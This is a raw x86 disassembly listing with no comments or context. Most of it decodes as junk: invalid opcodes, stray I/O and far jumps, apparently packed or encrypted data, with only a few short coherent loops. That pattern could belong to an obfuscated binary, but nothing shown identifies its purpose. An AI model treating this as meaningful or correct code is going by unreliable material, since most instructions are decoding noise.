  411108:	or     DWORD PTR [edx],0x50
  41110b:	mov    dh,0x53
  41110d:	add    bl,BYTE PTR [ebp+esi*1+0x14]
  411111:	jmp    0x6548b757
  411116:	sub    dl,ah
  411118:	inc    ebx
  411119:	rol    BYTE PTR [esi+0x78],1
  41111c:	scas   al,BYTE PTR es:[edi]
  41111d:	mov    edx,0x3bf0fe56
  411122:	mov    al,0xe2
  411124:	jl     0x4110ba
  411126:	popf   
  411127:	rcr    DWORD PTR [ebx+0x51],0x16
  41112b:	push   ebp
  41112c:	push   es
  41112d:	mov    esp,esi
  41112f:	inc    esp
  411130:	sub    eax,ebx
  411132:	and    DWORD PTR [edx+0x4],ebp
  411135:	aam    0x2b
  411137:	popa   
  411138:	into   
  411139:	inc    edx
  41113a:	retf   0xea9c
  41113d:	adc    dl,al
  41113f:	aam    0x18
  411141:	outs   dx,DWORD PTR ds:[esi]
  411142:	fwait
  411143:	push   0x67ce1712
  411148:	mov    edi,0xd7ea11b2
  41114d:	es loopne 0x4111a2
  411150:	add    al,0xe4
  411152:	xchg   ecx,eax
  411153:	in     eax,dx
  411154:	pop    edx
  411155:	je     0x411170
  411157:	arpl   WORD PTR [ecx-0x5a7cf7fa],cx
  41115d:	out    dx,eax
  41115e:	add    eax,0x7d37b508
  411163:	xor    DWORD PTR [ecx+0x50],edx
  411166:	dec    esi
  411167:	jmp    0x6d735f8d
  41116c:	xlat   BYTE PTR ds:[ebx]
  41116d:	shr    BYTE PTR [ecx+edi*1-0x8],0x72
  411172:	push   ds
  411173:	in     al,dx
  411174:	fist   DWORD PTR [edi+ebp*1]
  411177:	mov    cs,ecx
  411179:	les    esi,FWORD PTR ds:0x4c6936c3
  41117f:	mov    DWORD PTR [esi+0x70],edx
  411182:	fwait
  411183:	loopne 0x411114
  411185:	in     al,dx
  411186:	(bad)  
  411187:	and    al,0x49
  411189:	add    al,0x3c
  41118b:	in     al,0xe5
  41118d:	mov    bh,0x4
  41118f:	test   BYTE PTR [ebp+edi*2-0x651ee8ff],cl
  411196:	popf   
  411197:	loopne 0x411216
  411199:	push   es
  41119a:	add    BYTE PTR [ebx+ebp*8+0x17],dl
  41119e:	mov    ecx,0xe6f1a2ab
  4111a3:	mov    edi,0xbc49c1c1
  4111a8:	cmp    esp,ebx
  4111aa:	or     DWORD PTR [edx+edi*8],ebx
  4111ad:	dec    ebp
  4111ae:	and    DWORD PTR [eax],eax
  4111b0:	in     eax,dx
  4111b1:	addr16 ffreep st(1)
  4111b4:	fimul  DWORD PTR [ecx+edi*8]
  4111b7:	int3   
  4111b8:	sar    ah,cl
  4111ba:	dec    esi
  4111bb:	and    eax,ebp
  4111bd:	and    DWORD PTR [ebx],esi
  4111bf:	je     0x41121b
  4111c1:	test   BYTE PTR [edx+ebp*4+0x56a9b206],ch
  4111c8:	mov    eax,ds:0x5b656f68
  4111cd:	(bad)  
  4111ce:	sub    dh,BYTE PTR [ebx]
  4111d0:	(bad)  
  4111d2:	cs pop edi
  4111d4:	inc    esp
  4111d5:	ins    BYTE PTR es:[edi],dx
  4111d6:	pop    edi
  4111d7:	mov    ebx,fs
  4111d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111da:	and    cl,BYTE PTR [ebx+0x6dc74bd6]
  4111e0:	add    ah,BYTE PTR [esi]
  4111e2:	inc    ebp
  4111e3:	xor    DWORD PTR [ecx+0x31],ebp
  4111e6:	lahf   
  4111e7:	xchg   ebx,eax
  4111e9:	pop    edx
  4111ea:	mov    ah,0x84
  4111ec:	ret    0x2c94
  4111ef:	rol    dh,0xb2
  4111f2:	loopne 0x411199
  4111f4:	mov    cl,0xba
  4111f6:	ror    BYTE PTR [edx],cl
  4111f8:	sub    al,0x12
  4111fa:	push   esp
  4111fb:	pop    ss
  4111fc:	cmp    cl,al
  4111fe:	pop    esp
  4111ff:	sub    BYTE PTR [edx+esi*1-0x47],bl
  411203:	stos   DWORD PTR es:[edi],eax
  411204:	mov    ch,0xba
  411206:	fs pop ds
  411208:	push   ebp
  411209:	mov    dl,BYTE PTR [ebx+0x2b]
  41120c:	mov    dh,BYTE PTR [ebp-0x37579e8d]
  411212:	aas    
  411213:	int3   
  411214:	or     al,0x48
  411216:	lahf   
  411217:	and    edi,ecx
  411219:	adc    DWORD PTR [eax+0x48b6c009],edi
  41121f:	mov    ch,0xa7
  411221:	iret   
  411222:	pop    ss
  411223:	ins    DWORD PTR es:[edi],dx
  411224:	ins    DWORD PTR es:[edi],dx
  411225:	adc    ebx,DWORD PTR [edx+0x17ba621e]
  41122b:	(bad)  [esi-0x75d98609]
  411231:	clc    
  411232:	push   eax
  411233:	test   BYTE PTR [ebp+0x15],cl
  411236:	cmp    dh,BYTE PTR [edi-0x53]
  411239:	push   es
  41123a:	cmp    al,0x2f
  41123c:	fprem1 
  41123e:	ror    BYTE PTR ds:0x69a9c4d4,1
  411244:	adc    al,0x57
  411246:	xor    al,0x8
  411248:	push   esp
  411249:	add    ah,BYTE PTR [esi+0x4af1836]
  41124f:	pop    esi
  411250:	loope  0x411223
  411252:	push   ebp
  411253:	cmp    ebx,DWORD PTR [edx-0x4c]
  411256:	test   DWORD PTR [edi],ebx
  411258:	mov    edx,0xf5e40fd0
  41125d:	jae    0x411210
  41125f:	(bad)  
  411260:	jo     0x411209
  411262:	push   0x45
  411264:	fstp   DWORD PTR [edx-0x7eb98d29]
  41126a:	pop    ecx
  41126b:	lock fucomp st(7)
  41126e:	cmp    edi,DWORD PTR [eax]
  411270:	mov    eax,0x66bab11c
  411275:	cld    
  411276:	mov    ebx,0xce0127aa
  41127b:	ret    0xc4f1
  41127e:	and    BYTE PTR [esi],ah
  411280:	sbb    cl,BYTE PTR [edx]
  411282:	ret    
  411283:	ins    DWORD PTR es:[edi],dx
  411284:	xchg   eax,edx
  411286:	jg     0x411297
  411288:	mov    ds:0xef05b8b4,eax
  41128d:	fs aaa 
  41128f:	pop    edi
  411290:	ret    
  411291:	aad    0x7b
  411293:	jne    0x41123e
  411295:	in     eax,0x9a
  411297:	out    dx,eax
  411298:	aam    0xbe
  41129a:	aad    0x7f
  41129c:	push   eax
  41129d:	jmp    0x48fbeb41
  4112a2:	push   ds
  4112a3:	popf   
  4112a4:	xor    dl,dh
  4112a6:	loop   0x4112f8
  4112a8:	rcl    DWORD PTR [eax+0xf859c2b],cl
  4112ae:	into   
  4112af:	sub    al,ch
  4112b1:	(bad)  
  4112b2:	scas   al,BYTE PTR es:[edi]
  4112b3:	cmp    BYTE PTR [edi],ah
  4112b5:	rol    BYTE PTR [esi-0x19],cl
  4112b8:	mov    bl,0x3e
  4112ba:	jb     0x4112e2
  4112bc:	es xchg edi,eax
  4112be:	pop    es
  4112bf:	ins    DWORD PTR es:[edi],dx
  4112c0:	(bad)  
  4112c1:	lahf   
  4112c2:	mov    ds:0xc97d496c,eax
  4112c7:	in     al,0x55
  4112c9:	add    eax,0xd874a4e6
  4112ce:	hlt    
  4112cf:	xchg   BYTE PTR [esi+edi*8+0x79],ch
  4112d3:	mov    ds:0xccb0d622,eax
  4112d8:	(bad)  [ecx]
  4112da:	add    BYTE PTR [ecx],al
  4112dc:	lock xor eax,0x581cc39f
  4112e2:	in     eax,0x63
  4112e4:	dec    ebp
  4112e5:	ror    DWORD PTR [ebx-0x7100c4b],cl
  4112eb:	call   DWORD PTR [eax]
  4112ed:	lods   al,BYTE PTR ds:[esi]
  4112ee:	aad    0x53
  4112f0:	scas   al,BYTE PTR es:[edi]
  4112f1:	lods   eax,DWORD PTR ds:[esi]
  4112f2:	retf   0x42e
  4112f5:	fbstp  TBYTE PTR [eax+edx*2+0x6c]
  4112f9:	repnz mov esp,0x71fbb594
  4112ff:	or     eax,0x2f4a8ce7
  411304:	mov    ah,0xd7
  411306:	sbb    eax,0x4d1ac702
  41130b:	int3   
  41130c:	dec    ebp
  41130d:	call   0x6b2c:0x4ecd1493
  411314:	mov    al,BYTE PTR [edx]
  411316:	in     al,0x17
  411318:	or     eax,0x9e6937c1
  41131d:	jnp    0x4112ad
  41131f:	mov    dh,0x13
  411321:	test   al,0x7a
  411323:	push   ecx
  411324:	leave  
  411325:	ins    BYTE PTR es:[edi],dx
  411326:	lock push ss
  411328:	fisttp DWORD PTR [ebx+0x17]
  41132b:	mov    bl,0x3e
  41132d:	mov    esp,0x4f039cdc
  411332:	ror    edi,cl
  411334:	mov    ebx,0x7f0c6f54
  411339:	sbb    ecx,DWORD PTR [ebp+0x75]
  41133c:	jb     0x41134e
  41133e:	mov    edi,DWORD PTR [edx]
  411340:	cwde   
  411341:	add    DWORD PTR [esi],0x3797ecfa
  411347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411348:	lods   al,BYTE PTR ds:[esi]
  411349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134a:	jb     0x4112e5
  41134c:	out    0xf,eax
  41134e:	inc    BYTE PTR [eax-0x21]
  411351:	push   ss
  411352:	fisub  WORD PTR [esi-0x6faa7b4]
  411358:	and    al,0xd
  41135a:	mov    ecx,DWORD PTR [edx-0x1e386de1]
  411360:	sub    al,dl
  411362:	icebp  
  411363:	mov    al,ds:0xb709dcf1
  411368:	pop    ecx
  411369:	dec    edx
  41136a:	std    
  41136b:	fdivp  st(4),st
  41136d:	mov    ch,0x8
  41136f:	aam    0xa2
  411371:	rcl    DWORD PTR [edi],1
  411373:	or     DWORD PTR [edx-0x1fb4bc86],0x33232452
  41137d:	and    al,0x2a
  41137f:	cmp    eax,0xe4b9d932
  411384:	jmp    0xf588:0x82f7c20a
  41138b:	bound  esi,QWORD PTR [ebx+edi*2+0x3c6acb1e]
  411392:	xor    al,0x12
  411394:	sahf   
  411395:	(bad)
  411398:	lods   al,BYTE PTR ds:[esi]
  411399:	sub    al,0x3
  41139b:	jl     0x41132b
  41139d:	fdiv   DWORD PTR [ecx+esi*2+0x1a]
  4113a1:	cmp    BYTE PTR [edx+ebx*2+0x78],0x6c
  4113a6:	and    edx,edx
  4113a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113a9:	retf   
  4113aa:	jmp    0x41132c
  4113ac:	sbb    ch,BYTE PTR [ebx-0x71]
  4113af:	push   edi
  4113b0:	xor    DWORD PTR [esi],eax
  4113b2:	push   ebp
  4113b3:	or     dh,bh
  4113b5:	add    esi,DWORD PTR [edi-0x13]
  4113b8:	mov    DWORD PTR [edx+0x7b155304],esi
  4113be:	fsub   QWORD PTR [eax-0x5060d400]
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	add    DWORD PTR [eax+0x44],ebx
  41144a:	pop    ecx
  41144b:	push   cs
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x411490
  411454:	jno    0x4114b0
  411456:	pop    ds
  411457:	and    DWORD PTR [esi-0x76],edx
  41145a:	dec    ecx
  41145b:	icebp  
  41145c:	sbb    ch,bl
  41145e:	inc    esi
  41145f:	repz es or bh,cl
  411463:	imul   ebp,ebx,0x28
  411466:	mov    eax,0x61c05661
  41146b:	mov    esi,0x4c809452
  411470:	jns    0x411414
  411472:	pop    ecx
  411473:	int3   
  411474:	sbb    cl,BYTE PTR [ecx+0x68c0c827]
  41147a:	iret   
  41147b:	sub    cl,BYTE PTR [ecx-0x18a8bb4e]
  411481:	clc    
  411482:	iret   
  411483:	mov    eax,0x8a13f8
  411488:	jno    0x4114fb
  41148a:	cld    
  41148b:	inc    esi
  41148c:	sahf   
  41148d:	xchg   esp,eax
  41148e:	dec    edx
  41148f:	mov    bh,0xf0
  411491:	jmp    0x41150a
  411493:	sub    al,0x78
  411495:	push   edx
  411496:	hlt    
  411497:	js     0x411467
  411499:	jge    0x41150a
  41149b:	or     DWORD PTR [ebx],esp
  41149d:	(bad)  
  41149f:	js     0x41151b
  4114a1:	dec    ecx
  4114a2:	data16 aaa 
  4114a4:	sub    eax,0xed68e4b0
  4114a9:	inc    ebp
  4114aa:	jne    0x411496
  4114ac:	inc    edi
  4114ad:	fld    QWORD PTR [esi-0x30]
  4114b0:	ins    DWORD PTR es:[edi],dx
  4114b1:	out    dx,al
  4114b2:	out    0xaa,eax
  4114b4:	(bad)  
  4114b5:	cdq    
  4114b6:	pop    ebx
  4114b7:	call   0x58ed0476
  4114bc:	sub    al,0x37
  4114be:	imul   edx,DWORD PTR [eax+esi*8+0x6b],0xdcabeae9
  4114c6:	mov    dl,0x85
  4114c8:	jae    0x411508
  4114ca:	add    esp,DWORD PTR [ebp-0x14]
  4114cd:	test   BYTE PTR [eax+esi*2],bl
  4114d0:	lods   al,BYTE PTR ds:[esi]
  4114d1:	pop    esp
  4114d2:	out    dx,eax
  4114d3:	enter  0xa2fb,0xbf
  4114d7:	mov    dh,0xc1
  4114d9:	stos   BYTE PTR es:[edi],al
  4114da:	xchg   edx,eax
  4114db:	pop    ebp
  4114dc:	fsqrt  
  4114de:	xchg   DWORD PTR [edx+eiz*1],ebx
  4114e1:	mov    al,ds:0xc7a88e4
  4114e6:	sbb    dl,BYTE PTR [ebp-0x52505f]
  4114ec:	jo     0x4114c6
  4114ee:	hlt    
  4114ef:	pop    ds
  4114f0:	or     eax,edi
  4114f2:	fmulp  st(0),st
  4114f4:	sub    bh,BYTE PTR [esi]
  4114f6:	or     esp,DWORD PTR [edx+0xee2101a]
  4114fc:	push   es
  4114fd:	sar    eax,cl
  4114ff:	outs   dx,BYTE PTR ds:[esi]
  411500:	je     0x411493
  411502:	popa   
  411503:	pop    edx
  411504:	jns    0x41156d
  411506:	sbb    eax,0x450ecd58
  41150b:	ficom  DWORD PTR [ecx-0x45]
  41150e:	test   al,0xf9
  411510:	test   eax,0x9391f4a4
  411515:	aaa    
  411516:	and    eax,0x28383693
  41151b:	call   0x4463d6d5
  411520:	ret    
  411521:	xchg   edx,eax
  411522:	or     ch,0x49
  411525:	cmp    DWORD PTR [ebx-0x5],0xffffffcc
  411529:	cmp    al,0x30
  41152b:	and    BYTE PTR [edx-0x61],ah
  41152e:	iret   
  41152f:	mov    dl,0xe
  411531:	jbe    0x411517
  411533:	pop    ds
  411534:	int3   
  411535:	mov    eax,ds:0xb716d05d
  41153a:	dec    esp
  41153b:	arpl   WORD PTR [esi-0x590cdc3b],dx
  411541:	psrlq  mm6,QWORD PTR [edx-0x1]
  411545:	pop    es
  411546:	or     eax,0x415e67d5
  41154b:	push   ss
  41154c:	cmc    
  41154d:	or     eax,0x4b741d9a
  411552:	mov    eax,ds:0x6c37ac22
  411557:	int3   
  411558:	jbe    0x41152e
  41155a:	add    BYTE PTR [ecx+0x3e6ccce0],dl
  411560:	xor    BYTE PTR [ebp+0x17],ch
  411563:	xor    al,0x4
  411565:	test   BYTE PTR [edx-0x6444c45d],dl
  41156b:	test   DWORD PTR [esi-0x72],0xb5e19f7f
  411572:	ins    DWORD PTR es:[edi],dx
  411573:	test   al,0xd0
  411575:	out    dx,al
  411576:	lahf   
  411577:	clc    
  411578:	xor    ebx,0xffffffd4
  41157b:	adc    ch,BYTE PTR ds:0xbb5f6958
  411581:	les    eax,FWORD PTR [ebp+0x7ebd3ffb]
  411587:	xchg   edx,eax
  411588:	dec    ebp
  411589:	and    eax,0xc895bb81
  41158e:	aaa    
  41158f:	ret    0xcf3d
  411592:	dec    eax
  411593:	xchg   DWORD PTR [ecx+0x2c],ecx
  411596:	add    eax,0x94a6962d
  41159b:	jecxz  0x411613
  41159d:	test   eax,0x379e5913
  4115a2:	retf   0x5770
  4115a5:	mov    ecx,0x2f53a7f7
  4115aa:	mov    edi,0x46d8b5db
  4115af:	push   eax
  4115b0:	fsubr  QWORD PTR [edi+edx*4]
  4115b3:	rol    ah,0x42
  4115b6:	adc    eax,0xd3534028
  4115bb:	aaa    
  4115bc:	mov    cs,WORD PTR [eax+0x38]
  4115bf:	ins    BYTE PTR es:[edi],dx
  4115c0:	call   0x56d56f12
  4115c5:	and    eax,0x560b3c38
  4115ca:	adc    ebx,ebx
  4115cc:	adc    eax,0x5e6a61bb
  4115d1:	sub    BYTE PTR [edi-0x37a8d57f],ch
  4115d7:	jae    0x4115c9
  4115d9:	lea    eax,[edx-0x40]
  4115dc:	arpl   cx,ax
  4115de:	(bad)  
  4115e0:	out    dx,al
  4115e1:	es ja  0x4115c5
  4115e4:	jno    0x411575
  4115e6:	add    DWORD PTR [ebx],esp
  4115e8:	call   0xcfd3b6ba
  4115ed:	cmp    DWORD PTR [esi],eax
  4115ef:	shl    BYTE PTR [edi-0x50bc9dda],cl
  4115f5:	sbb    al,0x88
  4115f7:	stos   DWORD PTR es:[edi],eax
  4115f8:	in     al,0xcf
  4115fa:	cmp    eax,0xb095fce6
  4115ff:	push   ebp
  411600:	mov    ecx,0x83e30789
  411605:	mov    cl,0x4e
  411607:	xchg   ebx,eax
  411608:	scas   eax,DWORD PTR es:[edi]
  411609:	dec    esp
  41160a:	loop   0x4115b9
  41160c:	push   esi
  41160d:	fidivr WORD PTR [ebx]
  41160f:	paddd  mm2,QWORD PTR [ebx+0x69d7d57d]
  411616:	ja     0x411672
  411618:	addr16 push ss
  41161a:	mov    cl,0x96
  41161c:	dec    ebx
  41161d:	jne    0x41163b
  41161f:	ret    0x70b6
  411622:	sbb    eax,ebx
  411624:	dec    esp
  411625:	fisttp QWORD PTR [esp+ebp*2+0x5655cade]
  41162c:	mov    eax,0x58a0abe3
  411631:	pop    edi
  411632:	loope  0x411662
  411634:	enter  0xe85,0x91
  411638:	div    BYTE PTR [ecx+0x6ed98bd5]
  41163e:	std    
  41163f:	std    
  411640:	xor    eax,eax
  411642:	xchg   esi,eax
  411643:	adc    DWORD PTR [ecx],edx
  411645:	aas    
  411646:	xor    eax,eax
  411648:	or     DWORD PTR [edx],0x1e
  41164b:	pop    edi
  41164c:	icebp  
  41164d:	mov    DWORD PTR [esi-0x18],ebx
  411650:	shl    eax,0xa
  411653:	adc    ecx,ebp
  411655:	call   0xe66b:0xad3cacdf
  41165c:	push   esp
  41165d:	aaa    
  41165e:	dec    esi
  41165f:	sbb    esi,DWORD PTR es:[eax+0x6c]
  411663:	test   eax,0xadd9281e
  411668:	inc    ebp
  411669:	out    dx,eax
  41166a:	push   ebx
  41166b:	or     al,0x22
  41166d:	xchg   edi,eax
  41166e:	jmp    FWORD PTR [ebp-0x29]
  411671:	and    al,0x3f
  411673:	cmp    eax,0x3ea24860
  411678:	in     al,0x24
  41167a:	outs   dx,BYTE PTR ds:[esi]
  41167b:	inc    ebp
  41167c:	imul   esi,esi,0x14
  41167f:	dec    eax
  411680:	xchg   ecx,eax
  411681:	xchg   edi,eax
  411682:	cs (bad) 
  411684:	ds std 
  411686:	jmp    0x4116da
  411688:	retf   
  411689:	mov    esi,0x6490b46d
  41168e:	dec    edi
  41168f:	aam    0x6a
  411691:	scas   al,BYTE PTR es:[edi]
  411692:	outs   dx,BYTE PTR ds:[esi]
  411693:	xchg   edx,eax
  411694:	xor    DWORD PTR [esi+edx*2-0x267eaa88],ebp
  41169b:	inc    ebx
  41169c:	iret   
  41169d:	xchg   ecx,eax
  41169e:	mov    ch,0xa5
  4116a0:	leave  
  4116a1:	pop    ss
  4116a2:	bound  ebp,QWORD PTR [ebp+eiz*8-0x68]
  4116a6:	push   0xa0a38c40
  4116ab:	sub    ch,BYTE PTR [edx+ecx*8]
  4116ae:	loopne 0x4116bd
  4116b0:	pusha  
  4116b1:	hlt    
  4116b2:	adc    esp,DWORD PTR [eax]
  4116b4:	pushf  
  4116b5:	jp     0x4116da
  4116b7:	(bad)  
  4116b8:	jp     0x411728
  4116ba:	(bad)  
  4116bb:	in     al,0xb2
  4116bd:	loopne 0x4116d3
  4116bf:	(bad)  
  4116c0:	cmc    
  4116c1:	gs jno 0x411738
  4116c4:	dec    eax
  4116c5:	dec    ecx
  4116c6:	mov    ah,0x2e
  4116c8:	sbb    al,0x2d
  4116ca:	xor    eax,0xa7fced8c
  4116cf:	and    BYTE PTR [edi],0x5d
  4116d2:	jo     0x411692
  4116d4:	xchg   ecx,eax
  4116d5:	mov    ebx,0xd25739ca
  4116da:	inc    edx
  4116db:	xlat   BYTE PTR ds:[ebx]
  4116dc:	int    0x33
  4116de:	(bad)  
  4116df:	fild   QWORD PTR [edi-0x68]
  4116e2:	sti    
  4116e3:	aaa    
  4116e4:	mov    edi,DWORD PTR ds:[ebx]
  4116e7:	xchg   bl,ch
  4116e9:	xchg   ecx,eax
  4116ea:	xchg   ebx,eax
  4116eb:	dec    esi
  4116ec:	adc    bh,BYTE PTR [eax]
  4116ee:	mov    esi,0xe385f82c
  4116f3:	or     eax,edx
  4116f5:	inc    esp
  4116f6:	sub    BYTE PTR [edx-0x56],0x45
  4116fa:	in     eax,0x9d
  4116fc:	xor    al,0x8c
  4116fe:	lods   al,BYTE PTR ds:[esi]
  4116ff:	xor    ebx,ecx
  411701:	int3   
  411702:	jmp    0xbfa6bb
  411707:	aaa    
  411708:	ror    BYTE PTR [ecx+edx*2-0x4f],cl
  41170c:	push   edi
  41170d:	push   0xfffffff5
  41170f:	xchg   esp,eax
  411710:	inc    edx
  411711:	cmp    al,0xc2
  411713:	das    
  411714:	or     BYTE PTR [ebp+0x2412ae4f],bh
  41171a:	aaa    
  41171b:	and    ch,BYTE PTR [esi+0x3a25e8bc]
  411721:	sub    al,0x7
  411723:	fldenv [eax+0x3a]
  411726:	dec    ebx
  411727:	inc    esp
  411728:	shr    esi,cl
  41172a:	fimul  WORD PTR [ebp+0x46fd81d4]
  411730:	push   ebp
  411731:	inc    ebx
  411732:	mov    bl,0x88
  411734:	lock daa 
  411736:	or     al,0xf4
  411738:	mov    ds:0x53b7a031,eax
  41173d:	std    
  41173e:	nop
  41173f:	shl    DWORD PTR [edi],1
  411741:	scas   al,BYTE PTR es:[edi]
  411742:	std    
  411743:	adc    al,0xb4
  411745:	pop    es
  411746:	push   esi
  411747:	and    cl,dh
  411749:	pop    esp
  41174a:	dec    ebx
  41174b:	lock mov eax,ds:0xcad63420
  411751:	lods   al,BYTE PTR ds:[esi]
  411752:	mov    ecx,0x1d8178c1
  411757:	rcr    DWORD PTR [edi+0x2b6b404],1
  41175d:	xchg   BYTE PTR [ebp+eax*1-0x37],ch
  411761:	adc    bh,0x2c
  411764:	fst    QWORD PTR [ebx-0x51]
  411767:	push   ecx
  411768:	retf   
  411769:	in     eax,dx
  41176a:	scas   eax,DWORD PTR es:[edi]
  41176b:	frstor ds:0xbd34c71a
  411771:	push   ebx
  411772:	push   ebx
  411773:	push   edi
  411774:	popf   
  411775:	mov    ds:0xc81ca88f,eax
  41177a:	loope  0x4117ef
  41177c:	push   esp
  41177d:	push   ebx
  41177e:	pop    esi
  41177f:	hlt    
  411780:	jge    0x4117b3
  411782:	sub    eax,0x93971140
  411787:	jecxz  0x41173b
  411789:	cmp    DWORD PTR [ebx-0x57],ebp
  41178c:	cli    
  41178d:	xor    esi,DWORD PTR [esi-0x18fb14bd]
  411793:	jne    0x411798
  411795:	mov    DWORD PTR [ebx+0x39b24e68],esp
  41179b:	out    0xae,al
  41179d:	xchg   DWORD PTR [ebx+0x3bf03004],eax
  4117a3:	jmp    0x4798a927
  4117a8:	in     eax,0x46
  4117aa:	loop   0x4117eb
  4117ac:	or     edx,DWORD PTR [edi-0xf0065fa]
  4117b2:	and    edi,ebp
  4117b4:	sahf   
  4117b5:	daa    
  4117b6:	xor    DWORD PTR [ebx+0x10e75292],edx
  4117bc:	out    0x5e,eax
  4117be:	mov    ah,0xcc
  4117c0:	mov    esp,0xa6fadf0a
  4117c5:	mov    esp,0xddd47f76
  4117ca:	mov    ds:0x4a3317a4,eax
  4117cf:	loopne 0x411830
  4117d1:	xchg   ebx,eax
  4117d2:	imul   edx,ebp,0x7412f44c
  4117d8:	pop    edx
  4117d9:	cs fdivr st(5),st
  4117dc:	pushf  
  4117dd:	aad    0xe5
  4117df:	jecxz  0x411806
  4117e1:	or     BYTE PTR [edx+0x20],al
  4117e4:	lods   eax,DWORD PTR ds:[esi]
  4117e5:	pop    ebx
  4117e6:	push   edx
  4117e7:	add    DWORD PTR [ebp+0xb],eax
  4117ea:	dec    ebx
  4117eb:	push   edx
  4117ec:	ror    bh,0xa0
  4117ef:	mov    ch,0xec
  4117f1:	adc    edx,DWORD PTR [esi-0xff8edfa]
  4117f7:	imul   esp,DWORD PTR ds:0x7ca4b5f3,0xffffffcd
  4117fe:	push   0xa0f367a0
  411803:	arpl   WORD PTR [eax+0x3d7a3203],di
  411809:	mul    BYTE PTR [edi+0x65]
  41180c:	ja     0x4117da
  41180e:	cmp    DWORD PTR [esi],edx
  411810:	dec    ebx
  411811:	dec    edi
  411812:	sbb    dh,BYTE PTR [ebp+0x7f39477c]
  411818:	jmp    0x9fa7c8eb
  41181d:	aaa    
  41181e:	or     dl,BYTE PTR [ecx+ebx*8]
  411821:	test   al,0x98
  411823:	(bad)  
  411824:	adc    eax,0xeaab4752
  411829:	add    al,0xfc
  41182b:	test   al,0x9
  41182d:	jl     0x411829
  41182f:	cmp    ax,0x2519
  411833:	aam    0x1
  411835:	aam    0xe1
  411837:	fs cwde 
  411839:	fild   DWORD PTR [esi-0x75]
  41183c:	jne    0x41184a
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x63b182e9],dl
  41187c:	aas    
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118e8
  411886:	loop   0x411835
  411888:	push   ebx
  411889:	mov    ecx,0x36aa73f1
  41188e:	jae    0x4118f8
  411890:	xor    dh,al
  411892:	popa   
  411893:	pop    ss
  411894:	in     al,0xe9
  411896:	pusha  
  411897:	into   
  411898:	fidivr WORD PTR [ecx+0x18]
  41189b:	cmp    ebx,DWORD PTR [ebx-0x1d04976d]
  4118a1:	daa    
  4118a2:	js     0x411854
  4118a4:	jnp    0x41188d
  4118a6:	addr16 inc esi
  4118a8:	pop    esp
  4118a9:	pop    ecx
  4118aa:	add    BYTE PTR [ebp+0x89a1ab5],ah
  4118b0:	pop    ebp
  4118b1:	stos   BYTE PTR es:[edi],al
  4118b2:	sub    DWORD PTR [eax-0x7d],edx
  4118b5:	inc    esp
  4118b6:	repz sbb bh,BYTE PTR [eax+0x34]
  4118ba:	call   0x259fc263
  4118bf:	or     al,0x26
  4118c1:	cli    
  4118c2:	xor    eax,0x1acbc7a
  4118c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118c8:	mov    ds:0xea928fd6,eax
  4118cd:	je     0x4118ba
  4118cf:	mov    al,ds:0xa9ef4d64
  4118d4:	sbb    BYTE PTR [ebp+0x4650f167],al
  4118da:	call   0xefaa:0xabc0690b
  4118e1:	mov    dl,0x3
  4118e3:	cld    
  4118e4:	push   edi
  4118e6:	cmp    ebx,DWORD PTR [edi+0x910a5fa]
  4118ec:	out    dx,eax
  4118ed:	pop    ds
  4118ee:	mov    esi,0xb6b36182
  4118f3:	not    DWORD PTR [edi+0x5c47b21c]
  4118f9:	loope  0x411946
  4118fb:	cmp    edx,DWORD PTR [ebx+0x2aeb0a91]
  411901:	mov    ah,0x45
  411903:	jl     0x41188d
  411905:	fild   QWORD PTR [eax]
  411907:	pop    esi
  411908:	fimul  DWORD PTR [ecx+ebx*4+0x63550d75]
  41190f:	xchg   ebx,eax
  411910:	push   ecx
  411911:	mov    ecx,0xe5371488
  411916:	aad    0x27
  411918:	sbb    dl,BYTE PTR [eax]
  41191a:	aaa    
  41191b:	dec    ebx
  41191c:	mov    esi,0x9c5f0aab
  411921:	mov    eax,0x2fcc72f9
  411926:	es icebp 
  411928:	ror    DWORD PTR [esi+0x79],0x5d
  41192c:	adc    eax,0x14660ce3
  411931:	or     BYTE PTR [edx+0x2b],al
  411934:	mov    edx,0x37a01139
  411939:	adc    esp,eax
  41193b:	js     0x411937
  41193d:	inc    eax
  41193e:	mov    bl,0xcd
  411940:	retf   0x7106
  411943:	(bad)  
  411944:	fdivr  st,st(7)
  411946:	stc    
  411947:	repz mov bh,0x1d
  41194a:	push   ebx
  41194b:	retf   
  41194c:	jmp    0x32be:0x4953331e
  411953:	ins    BYTE PTR es:[edi],dx
  411954:	push   cs
  411955:	jo     0x4119c5
  411957:	pop    ebp
